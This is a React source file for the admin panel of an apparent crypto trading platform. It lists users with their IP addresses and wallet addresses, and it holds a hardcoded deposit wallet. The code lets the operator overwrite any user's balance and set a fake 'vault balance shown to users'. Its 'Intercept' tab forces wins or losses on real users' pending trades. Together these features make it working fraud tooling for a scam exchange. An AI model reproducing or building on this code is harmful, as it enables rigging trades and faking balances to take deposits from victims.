
import React, { useState, useEffect, useMemo } from 'react';
import { WalletData, ActiveTrade } from '../types';
import { authService, UserRecord } from '../services/authService';

interface UserCardProps {
  user: any;
  onSave: (user: any, balance: string) => void;
  savingId: string | null;
  savedId: string | null;
}

const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) => {
  const currentBalance = user.balance_override || user.wallet_data?.balances?.[0]?.valueUsd || '0.00';
  const [localBal, setLocalBal] = useState(currentBalance);
  const uid = user.id.toString();
  return (
    <div className="bg-[#181C25] border border-indigo-500/20 p-6 rounded-[28px] space-y-4 shadow-xl">
      <div className="flex justify-between items-start">
        <div className="w-10 h-10 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black text-sm">
          {user.email ? '@' : 'W'}
        </div>
        <div className="text-[8px] text-gray-500 uppercase font-black">ID: {user.id}</div>
      </div>
      <div>
        <div className="text-sm font-bold text-gray-100 truncate">{user.email || user.wallet_address || 'Anonymous'}</div>
        {user.wallet_address && <div className="text-[9px] text-indigo-400 font-mono mt-0.5 truncate">{user.wallet_address}</div>}
        <div className="text-[8px] text-gray-500 font-mono mt-1">Last seen: {user.last_seen ? new Date(user.last_seen).toLocaleString() : 'N/A'}</div>
        <div className="text-[8px] text-gray-600 font-mono">IP: {user.ip_address || 'Unknown'}</div>
      </div>
      <div className="bg-[#0B0E11] p-3 rounded-2xl border border-[#2B3139]">
        <div className="text-[8px] text-gray-500 uppercase font-black mb-1">Current Balance</div>
        <div className="text-lg font-mono font-bold text-emerald-400">
          ${parseFloat(String(currentBalance).replace(/[^0-9.]/g, '') || '0').toLocaleString(undefined, { minimumFractionDigits: 2 })}
        </div>
      </div>
      <div className="space-y-2">
        <div className="text-[8px] text-gray-500 uppercase font-black">Set New Balance (USD)</div>
        <input
          type="text"
          value={localBal}
          onChange={e => setLocalBal(e.target.value)}
          placeholder="e.g. 15000.00"
          className="w-full bg-[#0B0E11] border border-[#2B3139] focus:border-indigo-500 rounded-xl px-3 py-2 text-sm text-emerald-400 font-mono outline-none transition-colors"
        />
        <button
          onClick={() => onSave(user, localBal)}
          disabled={savingId === uid}
          className={`w-full py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${
            savedId === uid ? 'bg-emerald-600 text-white' : 'bg-indigo-600 hover:bg-indigo-500 text-white'
          } disabled:opacity-50`}
        >
          {savingId === uid ? 'Saving...' : savedId === uid ? '✓ Saved' : 'Set Balance'}
        </button>
      </div>
    </div>
  );
};

interface AdminDeskProps {
  onClose: () => void;
  managedWallet: WalletData | null;
  activeTrades: ActiveTrade[];
  onForceOutcome: (tradeId: string, updates: Partial<ActiveTrade>) => void;
  onUpdateWallet?: (data: WalletData) => void;
}

const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades, onForceOutcome, onUpdateWallet }) => {
  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'config'>('users');
  const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
  const [dbUsers, setDbUsers] = useState<any[]>([]);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [savingId, setSavingId] = useState<string | null>(null);
  const [savedId, setSavedId] = useState<string | null>(null);
  const [configSaving, setConfigSaving] = useState(false);
  const [configSaved, setConfigSaved] = useState(false);
  const [vaultInput, setVaultInput] = useState('');
  const [depositInput, setDepositInput] = useState('');

  // Load current config on mount
  useEffect(() => {
    const loadConfig = async () => {
      try {
        const res = await fetch('/api/config');
        if (res.ok) {
          const data = await res.json();
          setVaultInput(data.vault_balance || '25,000.00');
          setDepositInput(data.deposit_address || '0xcDEC8d41f2acCCA50064F24A089fC3F52Fadedd0');
        }
      } catch (_) {}
    };
    loadConfig();
  }, []);

  useEffect(() => {
    const fetchDbUsers = async () => {
      try {
        const res = await fetch('/api/admin/users');
        if (res.ok) setDbUsers(await res.json());
      } catch (e) { console.error('Failed to fetch users', e); }
    };
    fetchDbUsers();
    const interval = setInterval(fetchDbUsers, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const unsub = authService.subscribeToAllUsers(users => setRemoteUsers(users));
    return () => unsub();
  }, []);

  const realUserTrades = useMemo(() => activeTrades.filter(t => !t.isBot && t.status === 'pending'), [activeTrades]);

  const withdrawalRequests = useMemo(() => {
    const requests: { userId: string; tx: any; email?: string }[] = [];
    dbUsers.forEach(user => {
      const history = user.wallet_data?.history || [];
      history.forEach((tx: any) => {
        if (tx.type === 'Send' && tx.status === 'Pending') {
          requests.push({ userId: user.id.toString(), tx, email: user.email });
        }
      });
    });
    return requests.sort((a, b) => new Date(b.tx.timestamp).getTime() - new Date(a.tx.timestamp).getTime());
  }, [dbUsers]);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSaveBalance = async (user: any, newBalanceValue: string) => {
    setSavingId(user.id.toString());
    const amount = parseFloat(newBalanceValue.replace(/[^0-9.]/g, '')) || 0;
    const updatedWalletData = {
      ...(user.wallet_data || {}),
      balances: [{ symbol: 'USDT', amount: amount.toFixed(2), valueUsd: amount.toFixed(2) }]
    };
    try {
      await fetch('/api/admin/users/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: user.id, wallet_data: updatedWalletData, balance_override: newBalanceValue })
      });
      const updated = await fetch('/api/admin/users');
      if (updated.ok) setDbUsers(await updated.json());
      setSavedId(user.id.toString());
      setTimeout(() => setSavedId(null), 2000);
    } catch (e) {
      console.error('Save failed', e);
    } finally {
      setSavingId(null);
    }
  };

  const handleApproveWithdrawal = async (userId: string, txId: string) => {
    const user = dbUsers.find(u => u.id.toString() === userId);
    if (user) {
      const updatedHistory = (user.wallet_data?.history || []).map((tx: any) =>
        tx.id === txId ? { ...tx, status: 'Completed' } : tx
      );
      await fetch('/api/admin/users/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: parseInt(userId), wallet_data: { ...user.wallet_data, history: updatedHistory } })
      });
      const updated = await fetch('/api/admin/users');
      if (updated.ok) setDbUsers(await updated.json());
    }
  };

  const handleSaveConfig = async () => {
    setConfigSaving(true);
    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ vault_balance: vaultInput, deposit_address: depositInput })
      });
      if (res.ok) {
        window.dispatchEvent(new CustomEvent('configUpdated'));
        setConfigSaved(true);
        setTimeout(() => setConfigSaved(false), 3000);
      }
    } catch (e) {
      console.error('Config save failed', e);
    } finally {
      setConfigSaving(false);
    }
  };

  return (
    <div className="fixed inset-0 z-[1000] bg-[#0B0E11] text-gray-200 font-mono flex flex-col border-4 border-indigo-900/20">
      <div className="flex items-center justify-between p-6 bg-[#181C25] border-b border-[#2B3139]">
        <div className="flex items-center space-x-8">
          <h1 className="text-xl font-black italic uppercase text-indigo-400 tracking-tighter">Geko Protocols_Root</h1>
          <nav className="flex space-x-1">
            {[
              { id: 'users', label: 'User Nodes' },
              { id: 'intercept', label: 'Intercept' },
              { id: 'withdrawals', label: 'Withdrawals' },
              { id: 'config', label: 'Config' }
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest ${activeTab === tab.id ? 'bg-indigo-600 text-white' : 'text-gray-500 hover:bg-[#2B3139]'}`}
              >
                {tab.label}
              </button>
            ))}
          </nav>
        </div>
        <button onClick={onClose} className="px-6 py-2 bg-rose-900/20 text-rose-500 border border-rose-500/20 rounded-lg text-[10px] font-black uppercase">Close</button>
      </div>

      <div className="flex-1 overflow-y-auto p-8">

        {/* ── USER NODES ─────────────────────────────────────────── */}
        {activeTab === 'users' && (
          <div className="space-y-6">
            <div className="flex justify-between items-center px-4">
              <h2 className="text-lg font-black uppercase italic text-indigo-400">Registry — User Nodes</h2>
              <span className="text-[10px] text-gray-500 font-black">{dbUsers.length} REGISTERED</span>
            </div>

            {dbUsers.length === 0 && (
              <div className="text-center py-20 text-[11px] text-gray-600 font-black uppercase tracking-[0.4em]">
                No registered users yet. Users appear here when they connect.
              </div>
            )}

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {dbUsers.map(user => (
                <UserCard
                  key={user.id}
                  user={user}
                  onSave={handleSaveBalance}
                  savingId={savingId}
                  savedId={savedId}
                />
              ))}
            </div>
          </div>
        )}

        {/* ── INTERCEPT ──────────────────────────────────────────── */}
        {activeTab === 'intercept' && (
          <div className="space-y-6">
            <div className="flex justify-between items-center px-4">
              <h2 className="text-lg font-black uppercase italic text-rose-500">Live Trade Intercept</h2>
              <span className="text-[10px] text-indigo-400 font-black">{realUserTrades.length} ACTIVE</span>
            </div>
            <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden">
              <table className="w-full text-left">
                <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
                  <tr>
                    <th className="px-8 py-4">Node</th>
                    <th className="px-8 py-4">Side</th>
                    <th className="px-8 py-4">Amount</th>
                    <th className="px-8 py-4 text-right">Force Outcome</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#2B3139]">
                  {realUserTrades.map(tx => (
                    <tr key={tx.id} className="hover:bg-[#1E2329] transition-colors">
                      <td className="px-8 py-6">
                        <div className="text-xs font-bold text-indigo-400">{tx.userName}</div>
                        <div className="text-[9px] text-gray-500">ID: {tx.id.slice(-8)}</div>
                      </td>
                      <td className="px-8 py-6">
                        <span className={`text-[10px] font-black px-2 py-1 rounded ${tx.direction === 'up' ? 'bg-emerald-900/20 text-emerald-500' : 'bg-rose-900/20 text-rose-500'}`}>
                          {tx.direction.toUpperCase()}
                        </span>
                      </td>
                      <td className="px-8 py-6 font-bold">${tx.amount}</td>
                      <td className="px-8 py-6 text-right">
                        <div className="flex justify-end space-x-2">
                          <button
                            onClick={() => onForceOutcome(tx.id, { forceOutcome: 'win' })}
                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'win' ? 'bg-emerald-600 text-white border-emerald-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-emerald-500/50'}`}
                          >Allow Profit</button>
                          <button
                            onClick={() => onForceOutcome(tx.id, { forceOutcome: 'loss' })}
                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'loss' ? 'bg-rose-600 text-white border-rose-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-rose-500/50'}`}
                          >Force Loss</button>
                        </div>
                      </td>
                    </tr>
                  ))}
                  {realUserTrades.length === 0 && (
                    <tr><td colSpan={4} className="p-20 text-center text-[10px] text-gray-600 font-black uppercase tracking-[0.5em]">No Active Sessions</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ── WITHDRAWALS ────────────────────────────────────────── */}
        {activeTab === 'withdrawals' && (
          <div className="space-y-6">
            <div className="flex justify-between items-center px-4">
              <h2 className="text-lg font-black uppercase italic text-amber-500">Withdrawal Queue</h2>
              <span className="text-[10px] text-indigo-400 font-black">{withdrawalRequests.length} PENDING</span>
            </div>
            <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden">
              <table className="w-full text-left">
                <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
                  <tr>
                    <th className="px-8 py-4">User</th>
                    <th className="px-8 py-4">Asset / Amount</th>
                    <th className="px-8 py-4">Destination</th>
                    <th className="px-8 py-4 text-right">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#2B3139]">
                  {withdrawalRequests.map(({ userId, tx, email }) => (
                    <tr key={tx.id} className="hover:bg-[#1E2329] transition-colors">
                      <td className="px-8 py-6">
                        <div className="text-xs font-bold text-gray-200">{email || userId}</div>
                      </td>
                      <td className="px-8 py-6">
                        <div className="text-xs font-black text-rose-400">{tx.amount} {tx.asset}</div>
                        <div className="text-[9px] text-gray-500">{tx.timestamp}</div>
                      </td>
                      <td className="px-8 py-6">
                        <div className="flex items-center space-x-2">
                          <span className="text-[10px] font-mono text-indigo-400 bg-[#0B0E11] px-3 py-1 rounded-lg border border-[#2B3139] max-w-[200px] truncate">
                            {tx.destinationAddress}
                          </span>
                          <button onClick={() => copyToClipboard(tx.destinationAddress!, tx.id)} className="p-1.5 hover:bg-[#2B3139] rounded-lg transition-colors text-gray-500 hover:text-indigo-400">
                            {copiedId === tx.id ? <span className="text-[8px] text-emerald-500 font-black">✓</span> : <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>}
                          </button>
                        </div>
                      </td>
                      <td className="px-8 py-6 text-right">
                        <button
                          onClick={() => handleApproveWithdrawal(userId, tx.id)}
                          className="px-4 py-2 bg-emerald-900/20 text-emerald-500 border border-emerald-500/20 rounded-lg text-[9px] font-black uppercase hover:bg-emerald-600 hover:text-white transition-all"
                        >Confirm Payout</button>
                      </td>
                    </tr>
                  ))}
                  {withdrawalRequests.length === 0 && (
                    <tr><td colSpan={4} className="p-20 text-center text-[10px] text-gray-600 font-black uppercase tracking-[0.5em]">No Pending Withdrawals</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ── CONFIG ─────────────────────────────────────────────── */}
        {activeTab === 'config' && (
          <div className="space-y-6 max-w-2xl">
            <h2 className="text-lg font-black uppercase italic text-indigo-400 px-4">Protocol Overrides</h2>
            <div className="bg-[#181C25] border border-[#2B3139] p-8 rounded-[40px] space-y-8">

              {/* Vault Balance */}
              <div className="space-y-3">
                <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Vault Balance (shown to users)</label>
                <input
                  type="text"
                  value={vaultInput}
                  onChange={e => setVaultInput(e.target.value)}
                  placeholder="e.g. 25,000.00"
                  className="w-full bg-[#0B0E11] border border-[#2B3139] focus:border-indigo-500 rounded-2xl p-5 text-sm text-emerald-400 font-mono outline-none transition-colors"
                />
              </div>

              {/* Deposit Address */}
              <div className="space-y-3">
                <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Global Deposit Address</label>
                <input
                  type="text"
                  value={depositInput}
                  onChange={e => setDepositInput(e.target.value)}
                  placeholder="0x... or Solana address"
                  className="w-full bg-[#0B0E11] border border-[#2B3139] focus:border-indigo-500 rounded-2xl p-5 text-sm text-gray-100 font-mono outline-none transition-colors"
                />
              </div>

              {/* Save button */}
              <button
                onClick={handleSaveConfig}
                disabled={configSaving}
                className={`w-full py-5 font-black uppercase tracking-widest rounded-2xl shadow-xl transition-all text-sm ${
                  configSaved
                    ? 'bg-emerald-600 text-white'
                    : 'bg-indigo-600 hover:bg-indigo-500 text-white'
                } disabled:opacity-60`}
              >
                {configSaving ? 'Saving...' : configSaved ? '✓ Global Config Saved' : 'Save Global Config'}
              </button>

              <div className="p-4 bg-[#0B0E11] rounded-2xl border border-[#2B3139] text-[9px] text-gray-600 font-bold uppercase tracking-widest leading-relaxed">
                Changes are broadcast globally within 5 seconds to all connected users worldwide.
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="p-4 bg-rose-900/10 border-t border-rose-500/20 text-[9px] text-rose-500 font-bold uppercase tracking-widest text-center">
        Admin Access — Root Level — All Actions Are Final
      </div>
    </div>
  );
};

export default AdminDesk;
